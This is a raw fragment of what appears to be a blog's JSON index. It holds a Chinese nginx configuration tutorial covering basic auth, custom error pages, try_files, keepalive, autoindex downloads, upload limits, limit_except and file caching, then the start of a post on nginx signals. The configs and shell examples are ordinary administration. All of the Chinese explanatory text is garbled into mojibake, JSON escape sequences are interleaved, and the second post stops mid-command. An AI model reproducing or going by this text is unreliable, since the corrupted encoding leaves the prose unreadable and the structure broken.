} nginx è´¦æˆ·è®¤è¯åŠŸèƒ½ ç”± ngx_http_auth_basic_module æ¨¡å—æä¾›æ­¤åŠŸèƒ½\nå®˜æ–¹å¸®åŠ©ï¼šhttp://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\nèŒƒä¾‹ï¼š\n#CentOSå®‰è£…åŒ… [root@centos8 ~]#yum -y install httpd-tools #Ubuntuå®‰è£…åŒ… [root@Ubuntu ~]#apt -y install apache2-utils #åˆ›å»ºç”¨æˆ· #-b éäº¤äº’å¼æ–¹å¼æäº¤å¯†ç  #-c é‡æ–°ç”Ÿæˆæ–‡ä»¶ï¼Œè¦†ç›–å·²æœ‰æ–‡ä»¶ã€‚é¦–æ¬¡åˆ›å»ºæ—¶ä½¿ç”¨ [root@localhost html]# htpasswd -bc /apps/nginx/conf/.htpasswd user1 passwd1 Adding password for user user1 [root@localhost html]# htpasswd -b /apps/nginx/conf/.htpasswd user2 passwd2 Adding password for user user2 #ç”Ÿæˆäº†å¸¦æœ‰ä¸¤ä¸ªç”¨æˆ·çš„éªŒè¯æ–‡ä»¶ [root@localhost html]# tail /apps/nginx/conf/.htpasswd user1:$apr1$vzRe30iJ$jF8BZbra6pI8O0JBqlmiP/ user2:$apr1$i2ON7LYs$pxzkeH.xxCdgj670m5cSW/ #ç½‘ç«™ç™»å½•é¡µé¢é…ç½® [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /login { alias html/; index index.html; auth_basic \u0026#34;login password\u0026#34;; #æŒ‡å®šæç¤ºæ–‡æœ¬ä¿¡æ¯ auth_basic_user_file /apps/nginx/conf/.htpasswd; #æŒ‡å®šä½¿ç”¨çš„éªŒè¯æ–‡ä»¶ } } #ç›´æ¥è®¿é—®ç™»å½•é¡µï¼Œå¤±è´¥ã€‚æœªé€šè¿‡éªŒè¯ [root@localhost html]# curl pc.test.org/login/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Authorization Required\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;401 Authorization Required\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ##åˆ†åˆ«ä½¿ç”¨ä¸¤ç§æ–¹å¼è¾“å…¥ç”¨æˆ·åå’Œå¯†ç éªŒè¯ [root@localhost html]# curl http://user1:passwd1@pc.test.org/login/ hello [root@localhost html]# curl -u user2:passwd2 pc.test.org/login/ hello è‡ªå®šä¹‰é”™è¯¯é¡µé¢ è‡ªå®šä¹‰é”™è¯¯é¡µï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨æŒ‡å®šçš„å“åº”çŠ¶æ€ç è¿›è¡Œå“åº”, å¯åœ¨å¦‚ä¸‹è¯­å¥å—é…ç½®ï¼šhttp, server, location, if in\nlocation\næ ¼å¼ï¼š\nerror_page code ... [=[response]] uri; èŒƒä¾‹ï¼š\n# å‡†å¤‡ç«™ç‚¹é…ç½® [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; #è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢ï¼Œå‘ç”Ÿ404é”™è¯¯ï¼Œè¿”å›error.htmlé”™è¯¯é¡µé¢ location /error.html { root html/; } } #å‡†å¤‡é”™è¯¯é¡µé¢ [root@localhost html]# cat /apps/nginx/html/error.html error-page [root@localhost html]# nginx -s reload #è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢ï¼Œè§¦å‘404æŠ¥é”™ [root@localhost html]# curl -I pc.test.org/dd HTTP/1.1 404 Not Found #æŸ¥çœ‹é”™è¯¯ç  Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:02:12 GMT Content-Type: text/html Content-Length: 11 Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e411d9-b\u0026#34; #è§¦å‘404é”™è¯¯ï¼Œè¿”å›é”™è¯¯é¡µé¢ï¼ˆå¦‚æœæ˜¯æµè§ˆå™¨æµ‹è¯•ï¼Œå»ºè®®ç”¨googleï¼‰ [root@localhost html]# curl pc.test.org/dd error-page èŒƒä¾‹ï¼šå¦‚æœå‘ç”Ÿ404 ï¼Œå°†é”™è¯¯ç å®šä¹‰ä¸º502ï¼Œä¸”è·³è½¬åˆ°ä¸»é¡µ/index.html\n#ç«™ç‚¹é…ç½® [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 =502 /index.html; location /index.html { root html/; } } #ä¸»é¡µé…ç½® [root@localhost html]# cat /apps/nginx/html/index.html hello [root@localhost html]# nginx -s reload [root@localhost html]# curl pc.test.org/dd/ hello #éªŒè¯é”™è¯¯ç  [root@localhost html]# curl pc.test.org/dd/ -I HTTP/1.1 502 Bad Gateway #é”™è¯¯ç ä¸ºè‡ªå®šä¹‰çš„502 Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 17:31:49 GMT Content-Type: text/html Content-Length: 6 Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e40fa4-6\u0026#34; #é‡å®šå‘æˆåŠŸ [root@localhost html]# cat /apps/nginx/html/index.html hello è‡ªå®šä¹‰é”™è¯¯æ—¥å¿— é”™è¯¯æ—¥å¿—æ ¼å¼\nSyntax: error_log file [level]; #æ ¼å¼ Default: #é»˜è®¤å€¼ error_log logs/error.log error; Context: main, http, mail, stream, server, location #å¯é…ç½®çš„è¯­å¥å— level: debug, info, notice, warn, error, crit, alert, emerg #æ—¥å¿—è®°å½•ç­‰çº§ èŒƒä¾‹ï¼š\n#ç«™ç‚¹é…ç½® [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; error_page 404 400 /error.html; access_log /apps/nginx/logs/test-access.log; #è‡ªå®šä¹‰æ­£å¸¸è®¿é—®æ—¥å¿— error_log /apps/nginx/logs/test-error.log; #è‡ªå®šä¹‰é”™è¯¯æ—¥å¿— location /error.html { root html/; } } #å½“å‰å·²æœ‰æ—¥å¿—æ–‡ä»¶ [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid #é‡å¯nginxåç”Ÿæˆè‡ªå®šä¹‰çš„é”™è¯¯æ—¥å¿— [root@localhost html]# nginx -s reload [root@localhost html]# ls /apps/nginx/logs/ access.log error.log nginx.pid test-access.log test-error.log #è®¿é—®ç«™ç‚¹ [root@localhost html]# curl pc.test.org hello #æ—¥å¿—æˆåŠŸè®°å½• [root@localhost html]# tail /apps/nginx/logs/{test-access,test-error}.log ==\u0026gt; /apps/nginx/logs/test-access.log \u0026lt;== 172.16.16.88 - - [30/Jul/2022:01:17:55 +0800] \u0026#34;GET / HTTP/1.1\u0026#34; 200 6 \u0026#34;-\u0026#34; \u0026#34;curl/7.29.0\u0026#34; ==\u0026gt; /apps/nginx/logs/test-error.log \u0026lt;== æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ try_filesä¼šæŒ‰é¡ºåºæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼ˆç»“å°¾åŠ æ–œçº¿è¡¨ç¤ºä¸ºæ–‡ä»¶å¤¹ï¼‰ï¼Œå¦‚\næœæ‰€æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹éƒ½æ‰¾ä¸åˆ°ï¼Œä¼šè¿›è¡Œä¸€ä¸ªå†…éƒ¨é‡å®šå‘åˆ°æœ€åä¸€ä¸ªå‚æ•°ã€‚åªæœ‰æœ€åä¸€ä¸ªå‚æ•°å¯ä»¥å¼•èµ·ä¸€\nä¸ªå†…éƒ¨é‡å®šå‘ï¼Œä¹‹å‰çš„å‚æ•°åªè®¾ç½®å†…éƒ¨URIçš„æŒ‡å‘ã€‚æœ€åä¸€ä¸ªå‚æ•°æ˜¯å›é€€URIä¸”å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™ä¼šå‡ºç°å†…\néƒ¨500é”™è¯¯ã€‚\nSyntax: try_files file ... uri; try_files file ... =code; Default: â€” Context: server, location èŒƒä¾‹: å¦‚æœä¸å­˜åœ¨é¡µé¢, å°±è½¬åˆ°default.htmlé¡µé¢\n#å‡†å¤‡ç«™ç‚¹é…ç½® [root@localhost html]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html /about/default.html; } } #å‡†å¤‡é»˜è®¤é¡µé¢ [root@localhost html]# cat /apps/nginx/html/default.html default #è®¿é—®æµ‹è¯• [root@localhost ~]# cat /apps/nginx/html/about/default.html about_page [root@localhost ~]# curl pc.test.org/xx/ about_page [root@localhost ~]# curl pc.test.org/xx.html about_page ##è‡ªå®šä¹‰å“åº”ç  [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/; index index.html; try_files $uri $uri.html $uri/index.html =555; #è‡ªå®šä¹‰å“åº”ç ä¸º555 } } #éªŒè¯ç»“æœ [root@localhost ~]# curl pc.test.org/xx.html -I HTTP/1.1 555 #å“åº”ç ä¸º555 Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 10:00:03 GMT Content-Length: 0 Connection: keep-alive Keep-Alive: timeout=66 é•¿è¿æ¥é…ç½® keepalive_timeout timeout [header_timeout]; #è®¾å®šä¿æŒè¿æ¥è¶…æ—¶æ—¶é•¿ï¼Œ0è¡¨ç¤ºç¦æ­¢é•¿è¿æ¥ï¼Œé»˜è®¤ä¸º75sï¼Œé€šå¸¸é…ç½®åœ¨httpå­—æ®µä½œä¸ºç«™ç‚¹å…¨å±€é…ç½® keepalive_requests number; #åœ¨ä¸€æ¬¡é•¿è¿æ¥ä¸Šæ‰€å…è®¸è¯·æ±‚çš„èµ„æºçš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤ä¸º100æ¬¡,å»ºè®®é€‚ å½“è°ƒå¤§,æ¯”å¦‚:500 èŒƒä¾‹ï¼š\n#ç«™ç‚¹ä¸»é…ç½®é¡¹ [root@localhost ~]# cat /apps/nginx/conf/nginx.conf | grep keepalive keepalive_requests 3; keepalive_timeout 65 60; [root@localhost ~]# cat /apps/nginx/html/index.html hello #é•¿è¿æ¥æµ‹è¯• [root@localhost ~]# telnet localhost 80 Trying ::1... telnet: connect to address ::1: Connection refused Trying 127.0.0.1... Connected to localhost. Escape character is \u0026#39;^]\u0026#39;. GET / HTTP/1.1 #å‘èµ·getè¯·æ±‚ï¼Œé‡å¤ä¸‰æ¬¡æˆ–è€…æ—¶é—´åˆ°è¾¾65ç§’åï¼Œæœ¬æ¬¡é“¾æ¥è‡ªåŠ¨ç»ˆæ­¢ HOST: localhost #åŸŸåä¸ºlocalhost HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 01 Aug 2022 11:03:09 GMT Content-Type: text/html Content-Length: 6 Last-Modified: Fri, 29 Jul 2022 16:49:40 GMT Connection: keep-alive Keep-Alive: timeout=60 #æ˜¾ç¤ºçš„è¶…æ—¶æ—¶é—´ ETag: \u0026#34;62e40fa4-6\u0026#34; Accept-Ranges: bytes hello #è¿”å›çš„é¡µé¢å†…å®¹ ä½œä¸ºä¸‹è½½æœåŠ¡å™¨ ngx_http_autoindex_module æ¨¡å—å¤„ç†ä»¥æ–œæ å­—ç¬¦ \u0026ldquo;/\u0026rdquo; ç»“å°¾çš„è¯·æ±‚ï¼Œå¹¶ç”Ÿæˆç›®å½•åˆ—è¡¨,å¯ä»¥åšä¸ºä¸‹è½½æœåŠ¡\né…ç½®ä½¿ç”¨\nå®˜æ–¹é“¾æ¥ï¼šhttp://nginx.org/en/docs/http/ngx_http_autoindex_module.html\nç›¸å…³æŒ‡ä»¤\nautoindex on | off; #è‡ªåŠ¨æ–‡ä»¶ç´¢å¼•åŠŸèƒ½ï¼Œé»˜ä¸ºoff autoindex_exact_size on | off; #è®¡ç®—æ–‡ä»¶ç²¾ç¡®å¤§å°ï¼ˆå•ä½bytesï¼‰ï¼Œoff æ˜¾ç¤ºå¤§æ¦‚å¤§å°ï¼ˆå•ä½Kã€M)ï¼Œé»˜è®¤on autoindex_localtime on | off ; #æ˜¾ç¤ºæœ¬æœºæ—¶é—´è€ŒéGMT(æ ¼æ—å¨æ²»)æ—¶é—´ï¼Œé»˜è®¤off autoindex_format html | xml | json | jsonp; #æ˜¾ç¤ºç´¢å¼•çš„é¡µé¢æ–‡ä»¶é£æ ¼ï¼Œé»˜è®¤html limit_rate rate; #é™åˆ¶å“åº”å®¢æˆ·ç«¯ä¼ è¾“é€Ÿç‡(é™¤GETå’ŒHEADä»¥å¤–çš„æ‰€æœ‰æ–¹æ³•)ï¼Œå•ä½B/s,å³bytes/secondï¼Œé»˜è®¤å€¼0,è¡¨ç¤ºæ— é™åˆ¶,æ­¤æŒ‡ä»¤ç”±ngx_http_core_moduleæä¾› set $limit_rate 4k; #ä¹Ÿå¯ä»¥é€šå˜é‡é™é€Ÿ,å•ä½B/s,åŒæ—¶è®¾ç½®,æ­¤é¡¹ä¼˜çº§é«˜äºlimit_rate ###Rate limit can also be set in the $limit_rate variable, however, since version 1.17.0, this method is not recommended: èŒƒä¾‹ï¼šå°†nginxä½œä¸ºä¸‹è½½æœåŠ¡å™¨\n#æ³¨æ„:downloadä¸éœ€è¦index.htmlæ–‡ä»¶ [root@centos8 ~]# mkdir -p /data/nginx/html/pc/download [root@localhost ~]# touch /apps/nginx/html/download/{t1,t2,t3}.txt [root@localhost ~]# mkdir /apps/nginx/html/download/{d1,d2,d3} [root@localhost ~]# tree /apps/nginx/html/download /apps/nginx/html/download â”œâ”€â”€ d1 â”œâ”€â”€ d2 â”œâ”€â”€ d3 â”œâ”€â”€ t1.txt â”œâ”€â”€ t2.txt â””â”€â”€ t3.txt 3 directories, 3 files [root@centos8 ~]# cat /apps/nginx/conf.d/pc.conf location /download { autoindex on; #è‡ªåŠ¨ç´¢å¼•åŠŸèƒ½ autoindex_exact_size off; #è®¡ç®—æ–‡ä»¶ç¡®åˆ‡å¤§å°ï¼ˆå•ä½bytesï¼‰ï¼Œæ­¤ä¸ºé»˜è®¤å€¼,offåªæ˜¾ç¤ºå¤§æ¦‚å¤§ å°ï¼ˆå•ä½kbã€mbã€gbï¼‰ autoindex_localtime off; #onè¡¨ç¤ºæ˜¾ç¤ºæœ¬æœºæ—¶é—´è€ŒéGMT(æ ¼æ—å¨æ²»)æ—¶é—´,é»˜ä¸ºä¸ºoffæ˜¾ç¤ºGMT æ—¶é—´ limit_rate 1024k; #é™é€Ÿ,é»˜è®¤ä¸é™é€Ÿ root html/; } ç»“æœéªŒè¯\nä½œä¸ºä¸Šä¼ æœåŠ¡å™¨ ç›¸å…³æŒ‡ä»¤\nclient_max_body_size 1m; #è®¾ç½®å…è®¸å®¢æˆ·ç«¯ä¸Šä¼ å•ä¸ªæ–‡ä»¶å¤§å°çš„ä¸Šé™å€¼ï¼Œé»˜è®¤å€¼ä¸º1m,ä¸Šä¼ æ–‡ä»¶è¶…è¿‡æ­¤å€¼ä¼šå‡º413é”™è¯¯ client_body_buffer_size size; #ç”¨äºæ¥æ”¶æ¯ä¸ªå®¢æˆ·ç«¯è¯·æ±‚æŠ¥æ–‡çš„bodyéƒ¨åˆ†çš„ç¼“å†²åŒºå¤§å°;é»˜è®¤16k;è¶…å‡ºæ­¤å¤§å°æ—¶ï¼Œå…¶å°†è¢«æš‚å­˜åˆ°ç£ç›˜ä¸Šçš„ç”±client_body_temp_pathæŒ‡ä»¤æ‰€å®šä¹‰çš„ä½ç½® client_body_temp_path path [level1 [level2 [level3]]]; #è®¾å®šå­˜å‚¨å®¢æˆ·ç«¯è¯·æ±‚æŠ¥æ–‡çš„bodyéƒ¨åˆ†çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„åŠå­ç›®å½•ç»“æ„å’Œæ•°é‡ï¼Œç›®å½•åä¸º16è¿›åˆ¶çš„æ•°å­—ï¼Œä½¿ç”¨hashä¹‹åçš„å€¼ä»åå¾€å‰æˆªå–1ä½ã€2ä½ã€2ä½ä½œä¸ºç›®å½•å [root@centos8 ~]# md5sum /data/nginx/html/pc/index.html 95f6f65f498c74938064851b1bb 96 3d 4 /data/nginx/html/pc/index.html 1çº§ç›®å½•å 1ä½16è¿›åˆ¶ï¼Œå³2^4=16ä¸ªç›®å½• 0-f 2çº§ç›®å½•å 2ä½16è¿›åˆ¶ï¼Œå³2^8=256ä¸ªç›®å½• 00-ff 3çº§ç›®å½•å 2ä½16è¿›åˆ¶ï¼Œå³2^8=256ä¸ªç›®å½• 00-ff #é…ç½®ç¤ºä¾‹ï¼š client_max_body_size 100m; #å¦‚æœå¤ªå¤§ï¼Œä¸Šä¼ æ—¶ä¼šå‡ºç°413é”™è¯¯ã€‚æ³¨æ„:å¦‚æœphpä¸Šä¼ ï¼ˆå¦‚WordPressï¼‰,è¿˜éœ€è¦ä¿®æ”¹/etc/php.iniçš„ç›¸å…³é…ç½® client_body_buffer_size 1024k; client_body_temp_path /apps/nginx/client_body_temp/ 1 2 2; #ä¸Šä¼ æ—¶,Nginxä¼šè‡ªåŠ¨åˆ›å»ºç›¸å…³ç›®å½• ##ä¸Šä¼ æ–‡ä»¶å,ä¼šè‡ªåŠ¨ç”Ÿæˆç›¸å…³ç›®å½• [root@wang-liyun-pc ~]# tree /apps/nginx/client_body_temp/ /apps/nginx/client_body_temp/ â”œâ”€â”€ 5 â”‚Â â””â”€â”€ 00 â”‚Â â””â”€â”€ 00 â””â”€â”€ 6 â””â”€â”€ 00 â””â”€â”€ 00 å…¶ä»–é…ç½® keepalive_disable none | browser ...; #å¯¹å“ªç§æµè§ˆå™¨ç¦ç”¨é•¿è¿æ¥ limit_except method ... { ... } #ä»…ç”¨äºlocationè¯­å¥å—ï¼Œç¦æ­¢å®¢æˆ·ç«¯ä½¿ç”¨é™¤äº†æŒ‡å®šçš„è¯·æ±‚æ–¹æ³•ä¹‹å¤–çš„å…¶å®ƒæ–¹æ³•, å¦‚æœä½¿ç”¨ä¼šå‡ºç°403é”™è¯¯ method:GET, HEAD, POST, PUT, DELETEï¼ŒMKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH ##ç¤ºä¾‹ï¼šé™¤äº†GETä¹‹å¤–çš„å…¶å®ƒæ–¹æ³•ä»…å…è®¸172.16.16.0/24ç½‘æ®µä¸»æœºä½¿ç”¨ [root@localhost ~]# hostname -I #æœ¬æœºIP 172.16.16.88 [root@localhost ~]# ll /apps/nginx/html/upload/ #æ–°å»ºuploadç›®å½•ç”¨äºå­˜å‚¨ä¸Šä¼ çš„æ–‡ä»¶ total 0 [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /upload { root html/; index index.html; limit_except GET { allow 172.16.16.88; deny all; } } } [root@localhost ~]# nginx -s reload [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u0026lt;url\u0026gt; malformed \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;405 Not Allowed\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; #PUTæ–¹æ³•å…·æœ‰è®¿é—®æƒé™ï¼Œä½†æ˜¯ç¨‹åºæœ¬èº«ä¸æ”¯æŒæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;405 Not Allowed\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [root@localhost ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location /upload { root html/; index index.html; limit_except GET { #allow 172.16.16.88; #ç¦æ­¢æ‰€æœ‰ä¸»æœºä½¿ç”¨GETä»¥å¤–çš„æ–¹æ³• deny all; } } } [root@localhost ~]# curl -XPUT /etc/issue pc.test.org/upload curl: (3) \u0026lt;url\u0026gt; malformed \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; #å†æ¬¡è®¿é—®æµ‹è¯•ï¼Œnginxæ‹’ç»è®¿é—® \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; aio on | off #æ˜¯å¦å¯ç”¨asynchronous file I/O(AIO)åŠŸèƒ½ï¼Œéœ€è¦ç¼–è¯‘æ—¶æ·»åŠ å‚æ•°å¼€å¯ --with-file-aio #linux 2.6ä»¥ä¸Šå†…æ ¸æä¾›ä»¥ä¸‹å‡ ä¸ªç³»ç»Ÿè°ƒç”¨æ¥æ”¯æŒaioï¼š 1ã€SYS_io_setupï¼šå»ºç«‹aio çš„context 2ã€SYS_io_submit: æäº¤I/Oæ“ä½œè¯·æ±‚ 3ã€SYS_io_geteventsï¼šè·å–å·²å®Œæˆçš„I/Oäº‹ä»¶ 4ã€SYS_io_cancelï¼šå–æ¶ˆI/Oæ“ä½œè¯·æ±‚ 5ã€SYS_io_destroyï¼šæ¯é”€aioçš„context directio size | off; #æ“ä½œå®Œå…¨å’Œaioç›¸åï¼Œaioæ˜¯è¯»å–æ–‡ä»¶è€Œdirectioæ˜¯å†™æ–‡ä»¶åˆ°ç£ç›˜ï¼Œé»˜è®¤ä¸ºå…³é—­ï¼Œå½“æ–‡ä»¶å¤§äºç­‰äºç»™å®šå¤§å°æ—¶ï¼Œä¾‹å¦‚:directio 4mï¼ŒåŒæ­¥ï¼ˆç›´æ¥ï¼‰å†™ç£ç›˜ï¼Œè€Œéå†™ç¼“å­˜ã€‚ open_file_cache off; #æ˜¯å¦ç¼“å­˜æ‰“å¼€è¿‡çš„æ–‡ä»¶ä¿¡æ¯ open_file_cache max=N [inactive=time]; #nginxå¯ä»¥ç¼“å­˜ä»¥ä¸‹ä¸‰ç§ä¿¡æ¯ï¼š (1) æ–‡ä»¶å…ƒæ•°æ®ï¼šæ–‡ä»¶çš„æè¿°ç¬¦ã€æ–‡ä»¶å¤§å°å’Œæœ€è¿‘ä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´ (2) æ‰“å¼€çš„ç›®å½•ç»“æ„ (3) æ²¡æœ‰æ‰¾åˆ°çš„æˆ–è€…æ²¡æœ‰æƒé™è®¿é—®çš„æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ max=Nï¼š#å¯ç¼“å­˜çš„ç¼“å­˜é¡¹ä¸Šé™æ•°é‡;è¾¾åˆ°ä¸Šé™åä¼šä½¿ç”¨LRU(Least recently usedï¼Œæœ€è¿‘æœ€å°‘ä½¿ç”¨)ç®—æ³•å®ç°ç®¡ç† inactive=timeï¼š#ç¼“å­˜é¡¹çš„éæ´»åŠ¨æ—¶é•¿ï¼Œåœ¨æ­¤å¤„æŒ‡å®šçš„æ—¶é•¿å†…æœªè¢«å‘½ä¸­çš„æˆ–å‘½ä¸­çš„æ¬¡æ•°å°‘äº open_file_cache_min_uses #æŒ‡ä»¤æ‰€æŒ‡å®šçš„æ¬¡æ•°çš„ç¼“å­˜é¡¹å³ä¸ºéæ´»åŠ¨é¡¹ï¼Œå°†è¢«åˆ é™¤ open_file_cache_valid time; #ç¼“å­˜é¡¹æœ‰æ•ˆæ€§çš„æ£€æŸ¥éªŒè¯é¢‘ç‡ï¼Œé»˜è®¤å€¼ä¸º60s open_file_cache_errors on | off; #æ˜¯å¦ç¼“å­˜æŸ¥æ‰¾æ—¶å‘ç”Ÿé”™è¯¯çš„æ–‡ä»¶ä¸€ç±»çš„ä¿¡æ¯,é»˜è®¤å€¼ä¸ºoff open_file_cache_min_uses number; #open_file_cacheæŒ‡ä»¤çš„inactiveå‚æ•°æŒ‡å®šçš„æ—¶é•¿å†…ï¼Œè‡³å°‘è¢«å‘½ä¸­æ­¤å¤„æŒ‡å®šçš„æ¬¡æ•°æ–¹å¯è¢«å½’ç±»ä¸ºæ´»åŠ¨é¡¹,é»˜è®¤å€¼ä¸º1 èŒƒä¾‹ï¼š\nopen_file_cache max=10000 inactive=60s; #æœ€å¤§ç¼“å­˜10000ä¸ªæ–‡ä»¶ï¼Œéæ´»åŠ¨æ•°æ®è¶…æ—¶æ—¶é•¿60s open_file_cache_valid 60s; #æ¯é—´éš”60sæ£€æŸ¥ä¸€ä¸‹ç¼“å­˜æ•°æ®æœ‰æ•ˆæ€§ open_file_cache_min_uses 5; #60ç§’å†…è‡³å°‘è¢«å‘½ä¸­è®¿é—®5æ¬¡æ‰è¢«æ ‡è®°ä¸ºæ´»åŠ¨æ•°æ® open_file_cache_errors on; #ç¼“å­˜é”™è¯¯ä¿¡æ¯ ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/","summary":"\u003cp\u003eä¸»è¦ä»‹ç»Nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶\u003c/p\u003e","title":"Nginxæ ¸å¿ƒé…ç½®"},{"content":"åˆ©ç”¨Nginxä¿¡å·å®ç°å¹³æ»‘å‡çº§\nNginx å‘½ä»¤å’Œä¿¡å· Nginx å‘½ä»¤ å¯ä»¥é€šè¿‡nginxå‘½ä»¤å‘nginxè¿›ç¨‹å‘é€ä¿¡å·ï¼Œå®ç°å„ç§åŠŸèƒ½\nnginx å‘½ä»¤æ ¼å¼\nnginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] é€‰é¡¹è¯´æ˜\nå¸®åŠ©: -? -h ä½¿ç”¨æŒ‡å®šçš„é…ç½®æ–‡ä»¶: -c æŒ‡å®šé…ç½®æŒ‡ä»¤:-g æŒ‡å®šè¿è¡Œç›®å½•:-p æµ‹è¯•é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰è¯­æ³•é”™è¯¯:-t -T æ‰“å°nginxçš„ç‰ˆæœ¬ä¿¡æ¯ã€ç¼–è¯‘ä¿¡æ¯ç­‰:-v -V å‘é€ä¿¡å·: -s ç¤ºä¾‹: nginx -s reload ä¿¡å·è¯´æ˜\nç«‹åˆ»åœæ­¢æœåŠ¡:stop,ç›¸å½“äºä¿¡å·SIGTERM,SIGINT ä¼˜é›…çš„åœæ­¢æœåŠ¡:quit,ç›¸å½“äºä¿¡å·SIGQUIT å¹³æ»‘é‡å¯ï¼Œé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶: reload,ç›¸å½“äºä¿¡å·SIGHUP é‡æ–°å¼€å§‹è®°å½•æ—¥å¿—æ–‡ä»¶:reopen,ç›¸å½“äºä¿¡å·SIGUSR1,åœ¨åˆ‡å‰²æ—¥å¿—æ—¶ç”¨é€”è¾ƒå¤§ å¹³æ»‘å‡çº§å¯æ‰§è¡Œç¨‹åº:å‘é€ä¿¡å·SIGUSR2,åœ¨å‡çº§ç‰ˆæœ¬æ—¶ä½¿ç”¨ ä¼˜é›…çš„åœæ­¢å·¥ä½œè¿›ç¨‹:å‘é€ä¿¡å·SIGWINCH,åœ¨å‡çº§ç‰ˆæœ¬æ—¶ä½¿ç”¨ èŒƒä¾‹ï¼šæŸ¥çœ‹nginx ä½¿ç”¨å¸®åŠ©\n[root@centos7 ~]# nginx -h nginx version: nginx/1.18.0 Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /apps/nginx/) -c filename : set configuration file (default: conf/nginx.conf) -g directives : set global directives out of configuration file quit ä¿¡å· quitä¿¡å·è¿è¡Œæµç¨‹\nè®¾ç½®å®šæ—¶å™¨: worker_shutdown_timeout #ä¸€å®šæ—¶é—´åå…³é—­workè¿›ç¨‹ï¼Œé˜²æ­¢è¶…æ—¶ã€‚ å…³é—­ç›‘å¬å¥æŸ„ã€‚ #ä¸å†æ¥æ”¶æ–°çš„è¿æ¥è¯·æ±‚ å…³é—­ç©ºé—²è¿æ¥ åœ¨å¾ªç¯ä¸­ç­‰å¾…å…¨éƒ¨è¿æ¥å…³é—­ #å¾…è¿æ¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åå…³é—­è¿æ¥ é€€å‡ºnginxæ‰€æœ‰è¿›ç¨‹ èŒƒä¾‹ï¼šquit ä¿¡å·åœæ­¢nginxè¿›ç¨‹\n[root@centos7 html]# pwd #è¿›å…¥nginxå®‰è£…ç›®å½•ä¸‹ /apps/nginx/html [root@centos7 html]# dd if=/dev/zero of=/apps/nginx/html/bigfile bs=1M count=1024 #ç”Ÿæˆ1Gçš„å¤§æ–‡ä»¶bigfile 1024+0 records in 1024+0 records out 1073741824 bytes (1.1 GB) copied, 6.78492 s, 158 MB/s [root@centos7 html]# ll -h bigfile -rw-r--r-- 1 root root 1.0G Jul 21 17:37 bigfile [root@centos7 html]# hostname 